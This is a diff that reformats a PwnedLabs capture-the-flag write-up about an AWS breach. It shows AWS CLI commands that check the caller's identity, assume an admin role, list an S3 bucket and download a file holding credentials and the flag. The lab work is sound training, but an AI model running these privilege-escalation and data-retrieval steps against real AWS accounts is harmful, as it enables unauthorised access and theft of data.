@@ -1,32 +1,82 @@
-##_Scenario
+## 🚨 PwnedLabs - Breach in the Cloud
 
-We've_been_alerted_to_a_potential_security_incident._The_Huge_Logistics_security_team_have_provided_you_with_AWS_keys_of_an_account_that_saw_unusual_activity,_as_well_as_AWS_CloudTrail_logs_around_the_time_of_the_activity._We_need_your_expertise_to_confirm_the_breach_by_analyzing_our_CloudTrail_logs,_identifying_the_compromised_AWS_service_and_any_data_that_was_exfiltrated.
+### Scenario
+The Huge Logistics security team has provided you with credentials and logs following unusual activity. Your task is to investigate and confirm a potential breach.
 
-Access_key_id:_**REDACTED_FOR_LAB**
-Secret_access_key:_**REDACTED_FOR_LAB**
+**Access Key ID:** `REDACTED_FOR_LAB`  
+**Secret Access Key:** `REDACTED_FOR_LAB`
 
-Shows_this:
+---
+
+### Step 1: Check Identity with AWS CLI
+
+```bash
+aws sts get-caller-identity
+```
+
 ![Screenshot](images/pasted_image_20250518211436.png)
-Tried_to_access_this_bucket:
-![Screenshot](images/pasted_image_20250518211819.png)
-The_user_was_using_AssumedRole_to_assume_as_admin:
-![Screenshot](images/pasted_image_20250518212624.png)
-Used_the_command_to_try_assuming_role_and_it_worked:
-aws_sts_assume-role_\
-__--role-arn_arn:aws:iam::107513503799:role/AdminRole_\
-__--role-session-name_MySession
-![Screenshot](images/pasted_image_20250518212759.png)
-Configured_the_profile:
-aws_configure_--profile_assumed-admin
-aws_configure_set_profile.assumed-admin.aws_session_token_"<session_token>"
 
-The_command_aws_s3_ls_--profile_assumed-admin_showed_access_denied:
+---
+
+### Step 2: Analyze CloudTrail Logs
+Logs showed attempted access to a bucket named `emergency-data-recovery`:
+
+![Screenshot](images/pasted_image_20250518211819.png)
+
+Also, the `AssumedRole` mechanism was used to escalate privileges:
+
+![Screenshot](images/pasted_image_20250518212624.png)
+
+---
+
+### Step 3: Assume Admin Role
+Successfully assumed an admin role:
+
+```bash
+aws sts assume-role \
+  --role-arn arn:aws:iam::107513503799:role/AdminRole \
+  --role-session-name MySession
+```
+
+![Screenshot](images/pasted_image_20250518212759.png)
+
+Configured profile:
+
+```bash
+aws configure --profile assumed-admin
+aws configure set profile.assumed-admin.aws_session_token "<session_token>"
+```
+
+---
+
+### Step 4: S3 Enumeration
+
+Initial attempt:
+```bash
+aws s3 ls --profile assumed-admin
+```
+
+Resulted in access denied:
 ![Screenshot](images/pasted_image_20250518212909.png)
 
-But_command_aws_s3_ls_s3://emergency-data-recovery_--profile_assumed-admin_provided_the_list_of_files:
+---
+
+But listing the specific bucket worked:
+```bash
+aws s3 ls s3://emergency-data-recovery --profile assumed-admin
+```
+
 ![Screenshot](images/pasted_image_20250518213016.png)
 
-Downloaded_the_emergency.txt_file_with_command_aws_s3_cp_s3://emergency-data-recovery/emergency.txt_./_--profile_assumed-admin
+---
 
-The_file_contained_the_flag_and_other_sensitive_info_like_credentials:
+### Step 5: Retrieve Evidence
+```bash
+aws s3 cp s3://emergency-data-recovery/emergency.txt ./ --profile assumed-admin
+```
+
+The file contained credentials and the flag:
+
 ![Screenshot](images/pasted_image_20250518213151.png)
+
+---
